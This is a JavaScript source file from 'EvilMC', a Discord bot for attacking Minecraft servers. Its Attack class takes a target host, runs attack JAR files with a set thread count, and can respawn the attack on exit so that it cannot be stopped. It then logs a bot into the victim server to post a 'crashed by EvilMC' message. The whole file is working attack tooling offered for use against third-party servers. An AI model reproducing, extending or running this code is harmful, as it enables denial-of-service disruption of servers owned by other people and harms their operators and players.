/**
 * EvilMC v2.0 (https://github.com/theDesConnet/EvilMC)
 * c0d9d by DesConnet
 * 
 * Класс атаки
 */

const Client = require('./client');
const Discord = require('discord.js');
const mineflayer = require('mineflayer');
const treekill = require('tree-kill');
const child = require('child_process');
const config = require('../jsons/config.json');
const { delay } = require('../libs/dhelper');

class Attack {
    /**
     * @typedef {{name: string, text: string, jar: { name: string, args: string }, types: Array<{name: string, value: string}>}} AttackType
     * @typedef {{client: Client, interaction: Discord.CommandInteraction, message: Discord.Message, attack: AttackType, hostInfo: { ip: string, port: number | undefined }, threads: number, unstopable: boolean}} AttackOptions
     * @param {AttackOptions} options 
     */
    constructor(options) {
        this.client = options.client,
            this.interaction = options.interaction,
            this.message = options.message,
            this.attack = options.attack,
            this.hostInfo = options.hostInfo,
            this.threads = options.threads,
            this.unstopable = options.unstopable,
            this.ownerID = this.interaction.user.id;

        if (this.threads > config.General.maxAttackThreads || this.client.allThreads + this.threads > config.General.maxThreads) {
            this.client.attacks.delete(this.message.id);
            return this.client.errorembed(this.client, this.interaction, this.client.Language.getText('maxThreadsError', { activethreads: this.client.allThreads, maxthreads: config.General.maxAttackThreads }))
        }

        this.allThreads += this.threads;
        this.embed = new Discord.EmbedBuilder()
            .setColor('Random')
            .setFooter({
                text: `${this.interaction.guild.name} | EvilMC`,
                iconURL: this.client.user.avatarURL({ dynamic: true })
            });

        this.startAttack();
    }

    /**
     * Запуск атаки
     */
    async startAttack() {
        if (config.Features.autoResolver.enable && !this.hostInfo.port) {
            const res = await this.client.mineping.getInfo(this.hostInfo.ip).catch(async (err) => await this.client.errorembed(this.client, this.interaction, err))
            if (!res.online) {
                this.client.attacks.delete(this.message.id);
                return await this.client.errorembed(this.client, this.interaction, this.client.Language.getText("hostOfflineError"))
            }
            this.hostInfo = res.hostInfo;
        }

        let components = [];
        if (config.Features.msgToServer) {
            this.embed.setDescription(`${this.client.Language.getText("prepareAttack", { method: this.attack.text, host: this.hostInfo.ip, port: this.hostInfo.port ?? 25565 })} \n ☆ Made with ♥ by DesConnet ☆`);
            await this.interaction.editReply({ embeds: [this.embed] });
            await this.sendMessageToServer(config.Features.msgToServer.settings.msg);
            await delay(1500);
        }

        console.log(this.client.Language.getText("runAttackLog", { attack: this.attack.text, name: this.attack.jar.name, args: this.attack.jar.args, owner: this.ownerID }));
        this.runJar();

        if (this.unstopable) {
            this.embed.setDescription(`${this.client.Language.getText("runUnstopableAttack", { method: this.attack.text, host: this.hostInfo.ip, port: this.hostInfo.port ?? 25565 })} \n ☆ Made with ♥ by DesConnet ☆`);
            components = [
                new Discord.ActionRowBuilder().addComponents([
                    new Discord.ButtonBuilder()
                        .setCustomId("stopAttack")
                        .setLabel(this.client.Language.getText("stopAttackLabel"))
                        .setStyle(Discord.ButtonStyle.Danger)
                ])
            ]
        } else {
            this.embed.setDescription(`${this.client.Language.getText("runAttack", { method: this.attack.text, host: this.hostInfo.ip, port: this.hostInfo.port ?? 25565 })} \n ☆ Made with ♥ by DesConnet ☆`);
            setTimeout(async () => await this.stopAttack(), 60000)
        }

        await this.interaction.editReply({ embeds: [this.embed], components });
    }

    /**
     * Запускаем JAR файл атаки
     */
    runJar() {
        this.attackProcess = child.exec(`java -jar ${config.General.jarPath}/${this.attack.jar.name} ${this.attack.jar.args.replace(/%HOST%/g, this.hostInfo.ip).replace(/%PORT%/g, this.hostInfo.port || 25565).replace(/%THREADS%/g, this.threads)}`,
            { deatached: true },
            (error, stdout, stderr) => {
                if (stderr) {
                    console.log(`StdErr: ${stderr}`);
                    return;
                }
                console.log(`[Attack log] ${stdout}`);
            })

        if (this.unstopable) {
            this.attackProcess.once("exit", (code, signal) => {
                this.runJar()
            })
        }
    }

    /**
     * Отправление сообщения на сервер
     * @param {String} msg - Сообщение которое мы хотим отправить
     */
    async sendMessageToServer(msg) {
        const bot = mineflayer.createBot({
            username: config.Features.msgToServer.settings.botName,
            host: this.hostInfo.ip,
            port: this.hostInfo.port
        })

        bot.on('login', () => {
            console.log(`${this.client.Language.getText("botLoginLog")}`);
            bot.chat(`/register ${config.Features.msgToServer.settings.botPass} ${config.Features.msgToServer.settings.botPass}`);
            bot.chat(`/login ${config.Features.msgToServer.settings.botPass}`);
            console.log(`${this.client.Language.getText("botAuthLog")}`);
            setTimeout(() => {
                bot.chat(`${msg} | crashed by EvilMC (c0d9d by DesConnet) [https://github.com/theDesConnet/EvilMC]`);
                console.log(`${this.client.Language.getText("botSendMessageLog")}`);
                setTimeout(() => bot.quit(), 1500);
            }, 2500);
        })

        bot.on('end', async (reason) => {
            console.log(`${this.client.Language.getText("botLogoutLog")}`);
        })
    }

    /**
     * Остановка атаки
     */
    async stopAttack() {
        console.log(`[INFO] ${this.client.Language.getText("stopAttackLog", { attack: this.attack.text, owner: this.ownerID })}`);
        this.client.attacks.delete(this.message.id);
        this.attackProcess.removeAllListeners();
        treekill(this.attackProcess.pid);
        this.embed.setDescription(`${this.client.Language.getText("stopAttack", { method: this.attack.text, host: this.hostInfo.ip, port: this.hostInfo.port ?? 25565 })} \n ☆ Made with ♥ by DesConnet ☆`);
        await this.interaction.editReply({ embeds: [this.embed], components: [] });
    }

}

module.exports = Attack;